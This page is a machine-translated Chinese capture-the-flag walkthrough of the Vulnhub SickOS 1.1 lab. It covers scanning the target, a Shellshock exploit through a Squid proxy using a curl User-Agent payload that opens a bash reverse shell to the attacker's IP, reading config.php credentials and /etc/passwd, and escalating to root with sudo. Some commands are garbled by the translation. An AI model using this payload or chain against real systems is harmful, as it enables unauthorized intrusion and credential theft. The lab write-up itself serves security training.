<html>
<head>
<title>Vulnhub Writeup/Walkthrough SickOS 1.1 | By Md Amiruddin</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vulnhub撰写/演练SickOS 1.1 |作者Md Amiruddin</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/sickos-1-1-capture-the-flag-walkthrough-27eb77acfc41?source=collection_archive---------2-----------------------#2022-12-21">https://infosecwriteups.com/sickos-1-1-capture-the-flag-walkthrough-27eb77acfc41?source=collection_archive---------2-----------------------#2022-12-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/c0298e80981aefed683ccd14ad4e47fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7bbUIfwx7XJCvV0q.jpg"/></div></div></figure><p id="a098" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这个CTF类似于OSCP考试课程中的实验。目标是危害目标并获得管理/根权限。</p><p id="286e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">旗帜:有一面旗帜</p><p id="abdf" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">DHCP:启用<br/> IP地址:自动分配</p><p id="0c7d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">病秧子1.1 OVA文件可以在<a class="ae kw" href="https://www.vulnhub.com/entry/sickos-11,132/" rel="noopener ugc nofollow" target="_blank">这里</a>下载。</p><p id="0568" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">对于这台Toppo机器，我使用了Virtual Box来运行目标机器。Kali Linux是解决这个CTF的攻击机器。</p><p id="897e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">足迹</strong></p><p id="f1e7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">正如你所看到的，神经病机器是通电的。现在，在我们开始使用ifconfig来找到你的攻击机器(kali)的IP地址。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/b9c0690bd33794f056abe43db7f83e59.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*aFF3bxIPzOE9vnY7.png"/></div></div></figure><p id="9d4c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我的目标的IP地址是10.0.2.9，我的Kali的IP地址是10.0.2.15。这些地址适用于我和我的网络，您的地址可能会有所不同。</p><p id="3592" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们将使用命令&gt;<strong class="ka ir"> netdiscover -i eth0 </strong>来发现病人的ip地址。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/51f381a6b52451e6557d4976a3b18a6c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*-r8qQIdkkeYPubzv.png"/></div></div></figure><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/699a89bbd3455a96643a10b06af04d8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*c8aR6jgg7P7AFOdI.png"/></div></div></figure><p id="6dfa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">接下来，我们需要了解目标有哪些端口和服务可用。为此，我们将对目标使用Nmap。</p><p id="e81c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令&gt;<strong class="ka ir"> nmap -sS -A -n -T5 10.0.2.9 </strong></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/ddd32ba7345422fdc8ec974ab3431cbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Z2yEi2Dd1kNH6u6i.png"/></div></div></figure><p id="df34" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">从nmap扫描中，我们了解到在端口3128上配置了一个Squid HTTP代理，并且在端口8080上运行的HTTP被关闭。HTTP的存在告诉我们很可能有一个网站。</p><p id="8240" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们通过用代理配置Nikto来查找web服务器上的漏洞。</p><p id="88f3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令&gt;<strong class="ka ir">nikto-h 10 . 2 . 2 . 9-use proxy</strong><a class="ae kw" href="http://10.0.2.9:3128" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">http://10 . 0 . 2 . 9:3128</strong></a></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/65eecba259ab2dc1eab95f5be5efc1c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hUAI70sYqgj3lHuD.png"/></div></div></figure><p id="681d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Nikto scan帮助我们识别服务器易受Shellshock漏洞的攻击。你可能想知道什么是shellshock漏洞。</p><p id="88e0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Shellshock是一种计算机错误，它利用UNIX命令执行shell-bash中的漏洞，方便黑客远程控制计算机系统并执行任意代码，这将影响基于UNIX的操作系统，包括Linux和Mac OS。</p><p id="f761" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了访问网站，我们需要配置Firefox浏览器的代理设置。首先启动Firefox，进入<strong class="ka ir">设置&gt;网络设置&gt;编辑手动代理配置&gt; Ok。</strong></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/79b3a3a84a5f86963c6adc43cbf5f16e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zyuRHNG_G6UvNw5Y.png"/></div></div></figure><p id="62f2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在我们点击“确定”并保存代理设置后，我们可以进入地址栏并输入目标的IP地址，这将为我们提供网站的主页。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/db6dc6cfcbd9eeb0020cdf4627edd01d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*i9VuN0mQs2b4g-rk.png"/></div></div></figure><p id="68fc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">你可以检查网站的源代码，但我在那里没有发现任何有用的东西。</p><p id="ef62" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在查看robots.txt之后，我们了解到有一个wolfcms页面。我们去看看。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/35ddd53cc54970161085b5c92f1734d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lfnZS8hWVoqb6u0g.png"/></div></div></figure><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/847a84510ced8c6daef2e35a43b44e2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*dVBtmoEDaHGTcIRs.png"/></div></div></figure><p id="c2d2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Wolfcms页面没有提供任何有用的信息。现在，我们将针对该站点运行漏洞利用shell shock—<a class="ae kw" href="http://www.cvedetails.com/cve/cve-2014-6271" rel="noopener ugc nofollow" target="_blank">CVE-2014–6271</a>和<a class="ae kw" href="http://www.cvedetails.com/cve/cve-2014-6278" rel="noopener ugc nofollow" target="_blank">CVE-2014–6278</a>。它将允许我们建立一个反向外壳。</p><p id="94d8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在打开第二个终端，运行下面的cURL命令。注意:这个命令是用我的目标和Kali IP (10.0.2.15)配置的，您的IP可能会有所不同。</p><p id="8208" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">命令使用&gt;<strong class="ka ir">curl-x</strong><a class="ae kw" href="http://10.0.2.9:3128" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">http://10 . 0 . 2 . 9:3128</strong><strong class="ka ir">-H " User-Agent:(){ ignored；};/bin/bash-I&gt;&amp;/dev/TCP/10 . 0 . 2 . 15/4444 0&gt;&amp;1 "</strong></a><a class="ae kw" href="http://10.0.2.9/cgi-bin/status" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">http://10 . 0 . 2 . 9/CGI-bin/status</strong></a></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/51e3ebcd4aa11c11745ca6d18a186603.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*AH8WjXAlHlGJSwzV.png"/></div></div></figure><p id="82f7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">但是首先要设置监听器端口并运行。</p><p id="70db" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令:<strong class="ka ir"> nc -lvnp 4444 </strong></p><p id="257a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">正如我们所见，我们的反向外壳已经建立！</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/8636dd747403dcaed454a39a3aef7fca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7y6RCf__pRyXePhw.png"/></div></div></figure><p id="2709" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">命令分解:</strong></p><p id="fee0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们使用-x开关来启动使用HTTP代理的连接。之后，我们使用-H开关来包含一个编辑过的用户代理头。我们执行的代码是一个反向TCP bash shell。</p><p id="e299" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">接下来，我们需要将默认位置更改为wolfcms文件夹，然后列出内容，看看我们能在那里找到什么。</p><p id="2c1c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">命令使用&gt;<strong class="ka ir"> cd /var/www/wolfcms </strong></p><p id="e093" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令&gt;<strong class="ka ir"> ls </strong></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/6f8ea95d6057ab23196e4f059251eeca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3qF5kBDY3Y79Swxz.png"/></div></div></figure><p id="c707" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们发现了一个config.php的文件，所以将尝试读取它。我们可以使用cat命令查看内容。</p><p id="1936" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">命令使用&gt;<strong class="ka ir">猫config.php</strong></p><p id="9cc0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这很有趣，我们得到了SQL访问的用户名和密码。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/f83a57a8474c778c1a6a55bf736dd55f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*qTIxOe5WSGLwJ81n.png"/></div></div></figure><p id="b710" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">之后，我们将使用cat命令打印出etc/passwd文件的内容。</p><p id="af07" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令&gt;<strong class="ka ir"> cat /etc/passwd </strong></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/9d5fa7238767e2209f0e9f3b16811e69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*fTUfvTnSqRfKI-1b.png"/></div></div></figure><p id="3135" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们找到了一个用户名“神经病”。因此，我们尝试使用用户sickos和我们之前找到的密码<a class="ae kw" href="https://cyberintelligencesolution.com/cdn-cgi/l/email-protection" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">【电子邮件保护】</strong> </a>建立一个ssh shell。</p><p id="059d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">打开第二个终端，尝试使用ssh登录到目标机器。</p><p id="808f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令&gt;<strong class="ka ir"> ssh </strong> <a class="ae kw" href="https://cyberintelligencesolution.com/cdn-cgi/l/email-protection" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">【邮件保护】</strong> </a>密码:<a class="ae kw" href="https://cyberintelligencesolution.com/cdn-cgi/l/email-protection" rel="noopener ugc nofollow" target="_blank">【邮件保护】</a></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/e60bbfee81c124b146003b087364ea2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*iB6OIqdYAkPIV93y.png"/></div></div></figure><p id="add0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如您所见，我们已成功登录。让我们看看神经病有什么样的权限。</p><p id="55e1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令:<strong class="ka ir"> sudo -l </strong></p><p id="a2fc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">神经病有根权限。让我们访问目标神经病的根。之后，将目录切换到根目录。</p><p id="695e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">命令使用&gt;<strong class="ka ir">须藤苏</strong></p><p id="f058" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">命令使用&gt;<strong class="ka ir"> cd /root </strong></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/c153febbb18928521f4d347506a053c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ITVGdZJ3N6Afymug.png"/></div></div></figure><p id="cb9d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们列出目录内容，看看有哪些权限。</p><p id="2930" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令&gt;<strong class="ka ir"> ls -la </strong></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/46ed4c2687adba03e0c5111a9a9e928a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*-Hfsx110mUL-GVND.png"/></div></div></figure><p id="a83e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因为我们找到了一个txt文件，所以要读取a 0216 ea 4d 51874464078 c 618298 b 1367 . txt文件的内容，我们将使用cat命令。</p><p id="ec8e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用的命令&gt;<strong class="ka ir">cat a 0216 ea 4d 51874464078 c 618298 b 1367 . txt</strong></p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi kx"><img src="../Images/f6db805d15f2a72db3d92c64ab825a8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*4ZPOwr_DFyC-igB2.png"/></div></div></figure><p id="3a0d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">最后我们拿到了旗子。</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><p id="c18c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><em class="lj">原载于2022年12月21日https://cyberintelligencesolution.com</em><a class="ae kw" href="https://cyberintelligencesolution.com/sickos-1-1-capture-the-flag-walkthrough/" rel="noopener ugc nofollow" target="_blank"><em class="lj"/></a><em class="lj">。</em></p></div></div>    
</body>
</html>